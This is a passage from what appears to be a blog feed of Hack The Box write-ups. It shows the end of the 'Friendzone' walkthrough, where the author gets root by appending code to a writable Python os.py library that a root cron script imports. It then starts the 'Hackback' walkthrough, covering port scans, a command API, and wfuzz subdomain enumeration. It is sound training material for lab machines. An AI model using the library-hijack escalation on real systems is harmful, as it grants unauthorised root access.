ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'friendzone.htb,10.10.10.123' (ECDSA) to the list of known hosts.
friend@friendzone.htb's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                             

You have mail.
Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
friend@FriendZone:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-did-the-regular-enumeration-and-i-ran-pspy-to-monitor-the-processes-to-see-if-theres-something-that-can-be-exploited-&quot;&gt;I did the regular enumeration and I ran &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;&lt;/a&gt; to monitor the processes to see if there’s something that can be exploited :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-some-time-i-saw-this-&quot;&gt;After some time I saw this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;root-runs-optserver_adminreporterpy--from-time-to-time&quot;&gt;Root runs &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/server_admin/reporter.py&lt;/code&gt;  from time to time.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = &quot;admin1@friendzone.com&quot;
from_address = &quot;admin2@friendzone.com&quot;

print &quot;[+] Trying to send email to %s&quot;%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-if-we-can-write-to-that-script-then-we-can-get-a-shell-as-root-unfortunately-we-cant-&quot;&gt;So if we can write to that script then we can get a shell as root. Unfortunately we can’t :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-noticed-that-its-importing-the-os-library-usually-python-libraries-are-only-writable-by-root-but-i-checked-ospy-and-friend-had-permissions-to-write-to-it-&quot;&gt;But I noticed that it’s importing the &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; library. Usually python libraries are only writable by root, but I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; and friend had permissions to write to it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
-rw-rw-r--  1 friend friend    476 Jul 12 14:39 os.py
-rw-r--r--  1 root   root     1187 Jul 12 14:40 os.pyc
-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-just-put-those-two-lines-at-the-bottom-of-ospy-&quot;&gt;So I just put those two lines at the bottom of &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-after-a-minute-i-got-a-shell-&quot;&gt;And after a minute I got a shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---ctf&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ctf/&quot;&gt;Hack The Box - CTF&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="smb" /><category term="Web" /><category term="LFI" /><category term="php" /><category term="ssh" /><category term="Python" /><summary type="html">Quick Summary Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is 10.10.10.123, I added it to /etc/hosts as friendzone.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT friendzone.htb Note : I didn’t do a script scan (-sC) because for some reason it took a lot of time and didn’t finish. We got ftp on port 21, ssh on port 22, dns on port 53, http on port 80, https on port 443 and smb. Unfortunately anonymous login wasn’t allowed on ftp : root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb Connected to friendzone.htb. 220 (vsFTPd 3.0.3) Name (friendzone.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; Let’s check smb. SMB I used smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/friendzone# smbclient –list friendzone.htb -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/friendzone/0.png" /></entry><entry><title type="html">Hack The Box - Hackback</title><link href="http://localhost:4000/hack-the-box/hackback/" rel="alternate" type="text/html" title="Hack The Box - Hackback" /><published>2019-07-06T00:00:00+02:00</published><updated>2019-07-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hackback</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hackback/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-hackback-retired-and-heres-my-write-up-about-it-hackback-was-a-very-hard-machine-full-of-different-steps-and-rabbit-holes-its-a-windows-machine-and-its-ip-is-101010128-i-added-it-to-etchosts-as-hackbackhtb-lets-jump-right-in-&quot;&gt;Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.128&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;hackback.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC hackback.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-two-http-ports-80-and-6666-i-also-ran-a-full-scan-but-well-get-to-that-later&quot;&gt;We got two &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports, 80 and 6666, I also ran a full scan but we’ll get to that later.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-both-ports-on-80-there-was-this-donkey-image-&quot;&gt;I checked both ports, on 80 there was this donkey image :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-and-it-got-nothing&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and it got nothing.&lt;/h4&gt;
&lt;h4 id=&quot;i-couldnt-send-a-request-to-port-6666-from-the-browser-so-i-used-curl-&quot;&gt;I couldn’t send a request to port 6666 from the browser so I used curl :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ 
&quot;Missing Command!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-says-missing-command&quot;&gt;It says &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Missing Command!&quot;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-i-tried-help-&quot;&gt;So I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/help&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help
&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-returned-a-list-of-what-commands-we-can-use-whoami-lists-information-about-the-user-running-this-service-not-really-important-list-lists-the-files-in-the-current-directory-&quot;&gt;It returned a list of what commands we can use. &lt;code class=&quot;highlighter-rouge&quot;&gt;/whoami&lt;/code&gt; lists information about the user running this service, not really important. &lt;code class=&quot;highlighter-rouge&quot;&gt;/list&lt;/code&gt; lists the files in the current directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list
[
    {
        &quot;Name&quot;:  &quot;aspnet_client&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;default&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;new_phish&quot;,
        &quot;length&quot;:  null
    },
    {
        &quot;Name&quot;:  &quot;http.ps1&quot;,
        &quot;Length&quot;:  1867
    },
    {
        &quot;Name&quot;:  &quot;iisstart.htm&quot;,
        &quot;Length&quot;:  703
    },
    {
        &quot;Name&quot;:  &quot;iisstart.png&quot;,
        &quot;Length&quot;:  99710
    }
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;info-prints-system-information-we-might-need-that-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/info&lt;/code&gt; prints system information, we might need that :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info
{
    &quot;WindowsBuildLabEx&quot;:  &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;,
    &quot;WindowsCurrentVersion&quot;:  &quot;6.3&quot;,
    &quot;WindowsEditionId&quot;:  &quot;ServerStandard&quot;,
    &quot;WindowsInstallationType&quot;:  &quot;Server&quot;,
    &quot;WindowsInstallDateFromRegistry&quot;:  &quot;\/Date(1542436874000)\/&quot;,
    &quot;WindowsProductId&quot;:  &quot;00429-00520-27817-AA520&quot;,
    &quot;WindowsProductName&quot;:  &quot;Windows Server 2019 Standard&quot;,
    &quot;WindowsRegisteredOrganization&quot;:  &quot;&quot;,
    &quot;WindowsRegisteredOwner&quot;:  &quot;Windows User&quot;,
    &quot;WindowsSystemRoot&quot;:  &quot;C:\\Windows&quot;,
    &quot;WindowsVersion&quot;:  &quot;1809&quot;,
    &quot;BiosCharacteristics&quot;:  null,
    &quot;BiosBIOSVersion&quot;:  null,
    &quot;BiosBuildNumber&quot;:  null,
    &quot;BiosCaption&quot;:  null,
    &quot;BiosCodeSet&quot;:  null,
    &quot;BiosCurrentLanguage&quot;:  null,
    &quot;BiosDescription&quot;:  null,
    &quot;BiosEmbeddedControllerMajorVersion&quot;:  null,
    &quot;BiosEmbeddedControllerMinorVersion&quot;:  null,
    &quot;BiosFirmwareType&quot;:  null,
    &quot;BiosIdentificationCode&quot;:  null,
    &quot;BiosInstallableLanguages&quot;:  null,
    &quot;BiosInstallDate&quot;:  null,
    &quot;BiosLanguageEdition&quot;:  null,
    &quot;BiosListOfLanguages&quot;:  null,
    &quot;BiosManufacturer&quot;:  null,
    &quot;BiosName&quot;:  null,
    &quot;BiosOtherTargetOS&quot;:  null,
    &quot;BiosPrimaryBIOS&quot;:  null,
    &quot;BiosReleaseDate&quot;:  null,
    &quot;BiosSeralNumber&quot;:  null,
    &quot;BiosSMBIOSBIOSVersion&quot;:  null,
    &quot;BiosSMBIOSMajorVersion&quot;:  null,
    &quot;BiosSMBIOSMinorVersion&quot;:  null,
    &quot;BiosSMBIOSPresent&quot;:  null,
    &quot;BiosSoftwareElementState&quot;:  null,
    &quot;BiosStatus&quot;:  null,
    &quot;BiosSystemBiosMajorVersion&quot;:  null,
    &quot;BiosSystemBiosMinorVersion&quot;:  null,
    &quot;BiosTargetOperatingSystem&quot;:  null,
    &quot;BiosVersion&quot;:  null,
    &quot;CsAdminPasswordStatus&quot;:  null,
    &quot;CsAutomaticManagedPagefile&quot;:  null,
    &quot;CsAutomaticResetBootOption&quot;:  null,
    &quot;CsAutomaticResetCapability&quot;:  null,
    &quot;CsBootOptionOnLimit&quot;:  null,
    &quot;CsBootOptionOnWatchDog&quot;:  null,
    &quot;CsBootROMSupported&quot;:  null,
    &quot;CsBootStatus&quot;:  null,
    &quot;CsBootupState&quot;:  null,
    &quot;CsCaption&quot;:  null,
    &quot;CsChassisBootupState&quot;:  null,
    &quot;CsChassisSKUNumber&quot;:  null,
    &quot;CsCurrentTimeZone&quot;:  null,
    &quot;CsDaylightInEffect&quot;:  null,
    &quot;CsDescription&quot;:  null,
    &quot;CsDNSHostName&quot;:  null,
    &quot;CsDomain&quot;:  null,
    &quot;CsDomainRole&quot;:  null,
    &quot;CsEnableDaylightSavingsTime&quot;:  null,
    &quot;CsFrontPanelResetStatus&quot;:  null,
    &quot;CsHypervisorPresent&quot;:  null,
    &quot;CsInfraredSupported&quot;:  null,
    &quot;CsInitialLoadInfo&quot;:  null,
    &quot;CsInstallDate&quot;:  null,
    &quot;CsKeyboardPasswordStatus&quot;:  null,
    &quot;CsLastLoadInfo&quot;:  null,
    &quot;CsManufacturer&quot;:  null,
    &quot;CsModel&quot;:  null,
    &quot;CsName&quot;:  null,
    &quot;CsNetworkAdapters&quot;:  null,
    &quot;CsNetworkServerModeEnabled&quot;:  null,
    &quot;CsNumberOfLogicalProcessors&quot;:  null,
    &quot;CsNumberOfProcessors&quot;:  null,
    &quot;CsProcessors&quot;:  null,
    &quot;CsOEMStringArray&quot;:  null,
    &quot;CsPartOfDomain&quot;:  null,
    &quot;CsPauseAfterReset&quot;:  null,
    &quot;CsPCSystemType&quot;:  null,
    &quot;CsPCSystemTypeEx&quot;:  null,
    &quot;CsPowerManagementCapabilities&quot;:  null,
    &quot;CsPowerManagementSupported&quot;:  null,
    &quot;CsPowerOnPasswordStatus&quot;:  null,
    &quot;CsPowerState&quot;:  null,
    &quot;CsPowerSupplyState&quot;:  null,
    &quot;CsPrimaryOwnerContact&quot;:  null,
    &quot;CsPrimaryOwnerName&quot;:  null,
    &quot;CsResetCapability&quot;:  null,
    &quot;CsResetCount&quot;:  null,
    &quot;CsResetLimit&quot;:  null,
    &quot;CsRoles&quot;:  null,
    &quot;CsStatus&quot;:  null,
    &quot;CsSupportContactDescription&quot;:  null,
    &quot;CsSystemFamily&quot;:  null,
    &quot;CsSystemSKUNumber&quot;:  null,
    &quot;CsSystemType&quot;:  null,
    &quot;CsThermalState&quot;:  null,
    &quot;CsTotalPhysicalMemory&quot;:  null,
    &quot;CsPhyicallyInstalledMemory&quot;:  null,
    &quot;CsUserName&quot;:  null,
    &quot;CsWakeUpType&quot;:  null,
    &quot;CsWorkgroup&quot;:  null,
    &quot;OsName&quot;:  null,
    &quot;OsType&quot;:  null,
    &quot;OsOperatingSystemSKU&quot;:  null,
    &quot;OsVersion&quot;:  null,
    &quot;OsCSDVersion&quot;:  null,
    &quot;OsBuildNumber&quot;:  null,
    &quot;OsHotFixes&quot;:  null,
    &quot;OsBootDevice&quot;:  null,
    &quot;OsSystemDevice&quot;:  null,
    &quot;OsSystemDirectory&quot;:  null,
    &quot;OsSystemDrive&quot;:  null,
    &quot;OsWindowsDirectory&quot;:  null,
    &quot;OsCountryCode&quot;:  null,
    &quot;OsCurrentTimeZone&quot;:  null,
    &quot;OsLocaleID&quot;:  null,
    &quot;OsLocale&quot;:  null,
    &quot;OsLocalDateTime&quot;:  null,
    &quot;OsLastBootUpTime&quot;:  null,
    &quot;OsUptime&quot;:  null,
    &quot;OsBuildType&quot;:  null,
    &quot;OsCodeSet&quot;:  null,
    &quot;OsDataExecutionPreventionAvailable&quot;:  null,
    &quot;OsDataExecutionPrevention32BitApplications&quot;:  null,
    &quot;OsDataExecutionPreventionDrivers&quot;:  null,
    &quot;OsDataExecutionPreventionSupportPolicy&quot;:  null,
    &quot;OsDebug&quot;:  null,
    &quot;OsDistributed&quot;:  null,
    &quot;OsEncryptionLevel&quot;:  null,
    &quot;OsForegroundApplicationBoost&quot;:  null,
    &quot;OsTotalVisibleMemorySize&quot;:  null,
    &quot;OsFreePhysicalMemory&quot;:  null,
    &quot;OsTotalVirtualMemorySize&quot;:  null,
    &quot;OsFreeVirtualMemory&quot;:  null,
    &quot;OsInUseVirtualMemory&quot;:  null,
    &quot;OsTotalSwapSpaceSize&quot;:  null,
    &quot;OsSizeStoredInPagingFiles&quot;:  null,
    &quot;OsFreeSpaceInPagingFiles&quot;:  null,
    &quot;OsPagingFiles&quot;:  null,
    &quot;OsHardwareAbstractionLayer&quot;:  null,
    &quot;OsInstallDate&quot;:  null,
    &quot;OsManufacturer&quot;:  null,
    &quot;OsMaxNumberOfProcesses&quot;:  null,
    &quot;OsMaxProcessMemorySize&quot;:  null,
    &quot;OsMuiLanguages&quot;:  null,
    &quot;OsNumberOfLicensedUsers&quot;:  null,
    &quot;OsNumberOfProcesses&quot;:  null,
    &quot;OsNumberOfUsers&quot;:  null,
    &quot;OsOrganization&quot;:  null,
    &quot;OsArchitecture&quot;:  null,
    &quot;OsLanguage&quot;:  null,
    &quot;OsProductSuites&quot;:  null,
    &quot;OsOtherTypeDescription&quot;:  null,
    &quot;OsPAEEnabled&quot;:  null,
    &quot;OsPortableOperatingSystem&quot;:  null,
    &quot;OsPrimary&quot;:  null,
    &quot;OsProductType&quot;:  null,
    &quot;OsRegisteredUser&quot;:  null,
    &quot;OsSerialNumber&quot;:  null,
    &quot;OsServicePackMajorVersion&quot;:  null,
    &quot;OsServicePackMinorVersion&quot;:  null,
    &quot;OsStatus&quot;:  null,
    &quot;OsSuites&quot;:  null,
    &quot;OsServerLevel&quot;:  4,
    &quot;KeyboardLayout&quot;:  null,
    &quot;TimeZone&quot;:  &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;,
    &quot;LogonServer&quot;:  null,
    &quot;PowerPlatformRole&quot;:  1,
    &quot;HyperVisorPresent&quot;:  null,
    &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;:  null,
    &quot;HyperVRequirementSecondLevelAddressTranslation&quot;:  null,
    &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;:  null,
    &quot;HyperVRequirementVMMonitorModeExtensions&quot;:  null,
    &quot;DeviceGuardSmartStatus&quot;:  0,
    &quot;DeviceGuardRequiredSecurityProperties&quot;:  null,
    &quot;DeviceGuardAvailableSecurityProperties&quot;:  null,
    &quot;DeviceGuardSecurityServicesConfigured&quot;:  null,
    &quot;DeviceGuardSecurityServicesRunning&quot;:  null,
    &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;:  null,
    &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;:  null
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;services-lists-the-services-thats-also-important-and-we-might-need-it-later-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/services&lt;/code&gt; lists the services, that’s also important and we might need it later :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services
[
    {
        &quot;name&quot;:  &quot;AJRouter&quot;,
        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
        &quot;displayname&quot;:  &quot;AllJoyn Router Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;ALG&quot;,
        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
        &quot;displayname&quot;:  &quot;Application Layer Gateway Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;AppHostSvc&quot;,
        &quot;startname&quot;:  &quot;localSystem&quot;,
        &quot;displayname&quot;:  &quot;Application Host Helper Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },

    -------------------
    Removed Long Output
    -------------------
    
    {
        &quot;name&quot;:  &quot;WpnService&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Push Notifications System Service&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;WSearch&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Search&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    },
    {
        &quot;name&quot;:  &quot;wuauserv&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;Windows Update&quot;,
        &quot;status&quot;:  &quot;OK&quot;
    }
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;netstat-lists-the-listening-ports-we-can-check-that-when-we-need-to-know-about-some-internal-services-but-for-now-we-will-just-ignore-it-the-rest-of-the-commands-are-not-really-doing-anything-useful-i-tried-to-exploit-this-service-since-its-executing-system-commands-however-it-wasnt-possible&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/netstat&lt;/code&gt; lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it’s executing system commands, however it wasn’t possible.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-wfuzz-with-subdomains-top1million-5000txt-from-seclists-to-enumerate-any-possible-subdomains-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt&quot;&gt;subdomains-top1million-5000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to enumerate any possible subdomains :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****                              
Target: http://10.10.10.128/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000007:  C=200     33 L       54 W          614 Ch        &quot;webdisk&quot;
000008:  C=200     33 L       54 W          614 Ch        &quot;pop&quot;
000001:  C=200     33 L       54 W          614 Ch        &quot;www&quot;
000002:  C=200     33 L       54 W          614 Ch        &quot;mail&quot;
000005:  C=200     33 L       54 W          614 Ch        &quot;webmail&quot;
000006:  C=200     33 L       54 W          614 Ch        &quot;smtp&quot;
000009:  C=200     33 L       54 W          614 Ch        &quot;cpanel&quot;
000010:  C=200     33 L       54 W          614 Ch        &quot;whm&quot;
000003:  C=200     33 L       54 W          614 Ch        &quot;ftp&quot;
000004:  C=200     33 L       54 W          614 Ch        &quot;localhost&quot;
000011:  C=200     33 L       54 W          614 Ch        &quot;ns1&quot;
000013:  C=200     33 L       54 W          614 Ch        &quot;autodiscover&quot;
000014:  C=200     33 L       54 W          614 Ch        &quot;autoconfig&quot;
000015:  C=200     33 L       54 W          614 Ch        &quot;ns&quot;
000016:  C=200     33 L       54 W          614 Ch        &quot;test&quot;
000012:  C=200     33 L       54 W          614 Ch        &quot;ns2&quot;
000017:  C=200     33 L       54 W          614 Ch        &quot;m&quot;
000020:  C=200     33 L       54 W          614 Ch        &quot;www2&quot;
000021:  C=200     33 L       54 W          614 Ch        &quot;ns3&quot;
000018:  C=200     33 L       54 W          614 Ch        &quot;blog&quot;
000019:  C=200     33 L       54 W          614 Ch        &quot;dev&quot;
000023:  C=200     33 L       54 W          614 Ch        &quot;forum&quot;
000022:  C=200     33 L       54 W          614 Ch        &quot;pop3&quot;
000026:  C=200     33 L       54 W          614 Ch        &quot;vpn&quot;
000025:  C=200     33 L       54 W          614 Ch        &quot;mail2&quot;
000024:  C=200     27 L       66 W          825 Ch        &quot;admin&quot;
000027:  C=200     33 L       54 W          614 Ch        &quot;mx&quot;

^C 
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;admin-gave-a-different-response-length-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; gave a different response length, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-this-login-form-&quot;&gt;It had this login form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-actually-didnt-do-anything-&quot;&gt;Which actually didn’t do anything :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form action=&quot;#&quot; method=&quot;post&quot;&amp;gt;
    &amp;lt;!-- USERNAME INPUT --&amp;gt;
    &amp;lt;label for=&quot;username&quot;&amp;gt;Username&amp;lt;/label&amp;gt;
    &amp;lt;input type=&quot;text&quot; placeholder=&quot;Enter Username&quot;&amp;gt;
    &amp;lt;!-- PASSWORD INPUT --&amp;gt;
